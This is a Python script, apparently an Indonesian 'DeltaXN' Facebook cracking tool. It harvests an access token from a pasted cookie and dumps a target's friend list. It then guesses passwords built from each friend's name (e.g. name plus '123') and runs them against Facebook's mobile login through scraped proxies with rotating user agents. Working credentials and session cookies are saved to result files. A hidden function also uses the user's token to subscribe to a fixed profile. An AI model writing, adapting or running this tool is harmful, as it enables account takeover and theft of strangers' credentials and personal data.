#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as DeltaXN 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
dump = []
memek = []
ualu,ualuh = [],[]
try:
        import rich
except ImportError:
        cetak(nel('\tSabar Puh Lagi Install Modul'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\tSabar Puh Lagi Install Modul'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\tSabar Puh Lagi Install Modul'))
	os.system('pip install requests && pip install mechanize ')
###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
sys.stdout.write('\x1b]2; DELtaXN | CRACKER\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mBrayennnXD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','SKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,250000)
	d=random.randrange(11,19)
	e=random.randrange(73,150)
	f=random.randrange(4200,6300)
	g=random.randrange(40,250)
	random1=random.choice(['TANK2','TPC-G1011LTE','Orange Neva zen'])
	delta1=f'Mozilla/5.0 (Linux; Android {a}; RMX3708 Build/UKQ1.{c}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]'
	delta2=f'Mozilla/5.0 (Linux; Android {a}; 23078RKD5C Build/UP1A.{c}.230905.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]'
	delta3=f'Mozilla/5.0 (Linux; Android {a}; CPH2499 Build/TP1A.{c}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]'
	uaku2 = random.choice([delta1, delta2, delta3])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
ses=requests.Session()
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login3()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"{m}>>> Author : {P}Mr-Cyber404")
	print(f"{m}>>> Group : {P}JABAR-ANON-SCURITY")
#------------------[ LOGIN-COOKIES ]-----------------#
#kukis
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		cookie=input(f"{m}Masukkan Cookies Yang Fressh : {h}")
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sGagal Mengambil Token, Harap Login Ulang%s'%(m, p))

			except:
				print('Gagal mengambil Token, Harap Login Ulang')

		print(f'{h}!!!LOGIN SUCCES!!!');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ MENU-MANJA ]-----------------#
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{m}>>> Cookies Invalid')
		time.sleep(2);os.system('clear')
		login3()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		id = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{m}Jaringan Lu Kyak Kontol")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		clear();login3()
		banner()
	prints(panel(f"[bold white]>>> Nama Tumbal : {nama} \n>>> ID Tumbal : {id} \n>>> SC : Pribadi",width=35,title=f"[bold red][ DeltaaXN Information ]",style=f"bold red"))
	print('')
	prints(panel(f"[bold white]Farmin, Iwan, Ampi, Nikson, Will, Alfred, Tang, Dumang, Rinto, Salmon, Dan Alif",title=f"[bold red][ Terima Kasih ]",style=f"bold red"))
	print('')
	prints(panel(f"[bold white]>>> 1.Crack Publik \n>>> 2.Check Result \n>>> 3.Keluar",width=30,title=f"[bold red][ DeltaaXN Menu ]",style=f"bold red"))
	kz = input(f"Pilih : ")
	if kz in ["1"]:
		idt = input('\nMasukkan ID Target Om : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif kz in ["2"]:
		result()
	elif kz in ["3"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		login3()
	else:
		print(f"{m}>>> Milih Yang Benar Anjing")
		time.sleep(2)
		exit()
#------------------[ RESULT ]-----------------#
def result():
	prints(panel(f"[bold white]>>> 1.Check Hasil OK \n>>>2.Check Hasil CP \n>>> 3.Kembali Kemenu",width=35,title=f"[bold red][ DeltaaXN Result ]",style=f"bold red"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' >>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} >>> {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' >>> Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n >>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' >>>  Pilih Yang Bener Kontol ')
		exit()
#------------------[ CRACK-PUBLIK ]-----------------#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>>> SUKSES MENGUMPULKAN{m} {len(id)}{P} ID{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	      

#------------------[ SETTING BENGKEL ]-----------------#
def setting():
	print('')
	prints(panel(f"[bold white]1.crack id old \n2.crack id new \n3.crack id random",width=25,title=f"[bold red][ IXB ID ]",style=f"bold red"))
	hu = input(f'Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' >>> Pilih Yang Bener Kontooll ')
		exit()
	prints(panel(f"[bold white]>>> 1.https://m.prod.facebook.com/[[bold green]async[bold white]]",width=45,title=f"[bold red][ DELtaXN Methode ]",style=f"bold red"))
	hc = input(f' >>> Pilih Metode : ')
	if hc in ['1','01']:
		method.append('async')
	else:
		method.append('async')
	prints(panel(f"[bold yellow]>>> 1.Password Betina \n[bold green]>>> 2.Password Jantan \n[bold red]>>> 3.Password Bencong",width=45,title=f"[bold red][ DELtaXN Password ]",style=f"bold red"))
	pwplus=input(f' >>> {P}Pilih sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' >>> {P}Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
			passwrd()
	else:
		pwpluss.append('no')
		passwrd()
#------------------[ WORDLIST ]-----------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	print(f"{m}----------------------------------------------------------")
	print(f"{P}MODE PESAWAT JIKA TIDAK ADA HASIL")
	print(f"{m}----------------------------------------------------------")
	wa.print(Columns(urut))
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'async' in method:
					pool.submit(crackasync,idf,pwv)
				else:
					pool.submit(crackasync,idf,pwv)
		print('')
	print(f'{m}  CRACK SELESAI')
	print(f'  {P}[{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))

#-----------------------[ METHODE-ASYNC ]--------------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{m}DeltaXN{x} [{loop}]/{len(id)} \n[bold green]OK-:[bold green]{ok} \n[bold yellow]CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.prod.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="8", "Chromium";v="120"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1736402916450835&kid_directed_site=0&app_id=1736402916450835&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1736402916450835%26cbt%3D1706780496374%26e2e%3D%257B%2522init%2522%253A1706780496374%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D15bde290-b9f9-4934-8c66-af70dd41bec8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c3f1b8d-418c-41b9-9072-fa7d5f27465d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522hb64d4r1psmsoareqhjo%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1736402916450835%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DVG5UB4BDRTnAZsvsq80qfKiL9F7DmHxIVoBEwyGCqjs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3c3f1b8d-418c-41b9-9072-fa7d5f27465d%26tp%3Dunspecified&cancel_url=fb1736402916450835%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c3f1b8d-418c-41b9-9072-fa7d5f27465d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522hb64d4r1psmsoareqhjo%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.600000023841858; wd=450x573'
			heade={
			"Host": "m.prod.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="120", "Google Chrome";v="120", "Not;A=Brand";v="8"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1736402916450835&kid_directed_site=0&app_id=1736402916450835&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1736402916450835%26cbt%3D1706780496374%26e2e%3D%257B%2522init%2522%253A1706780496374%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D15bde290-b9f9-4934-8c66-af70dd41bec8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c3f1b8d-418c-41b9-9072-fa7d5f27465d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522hb64d4r1psmsoareqhjo%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1736402916450835%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DVG5UB4BDRTnAZsvsq80qfKiL9F7DmHxIVoBEwyGCqjs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3c3f1b8d-418c-41b9-9072-fa7d5f27465d%26tp%3Dunspecified&cancel_url=fb1736402916450835%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c3f1b8d-418c-41b9-9072-fa7d5f27465d%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522hb64d4r1psmsoareqhjo%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.prod.facebook.com/login/device-based/login/async/?api_key=1591956834435357&auth_token=be46e7ef627531b60ea4ca42bdb1c9a0&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1591956834435357%26cbt%3D1706670036958%26e2e%3D%257B%2522init%2522%253A1706670036958%257D%26ies%3D1%26sdk%3Dandroid-12.1.0%26sso%3Dchrome_custom_tab%26nonce%3D8fa75ad8-b90c-4536-8c53-0cd08990a041%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1ae0c84-6cea-496b-83eb-9a9f7f68d1f1%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522gib090oqcu4p1k3i79vk%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.mobile.legends%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da1ae0c84-6cea-496b-83eb-9a9f7f68d1f1%26tp%3Dunspecified&refsrc=deprecated&app_id=1591956834435357&cancel=fbconnect%3A%2F%2Fcct.com.mobile.legends%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1ae0c84-6cea-496b-83eb-9a9f7f68d1f1%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522gib090oqcu4p1k3i79vk%2522%257D&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ DELtaXN CP ]",style=f"bold yellow"))
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nCOOKIES : {kuki}",title=f"[bold green][ DELtaXN OK ]",style=f"bold green"))
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('kz-OK')
	except:pass
	try:os.mkdir('kz-CP')
	except:pass
	menu()
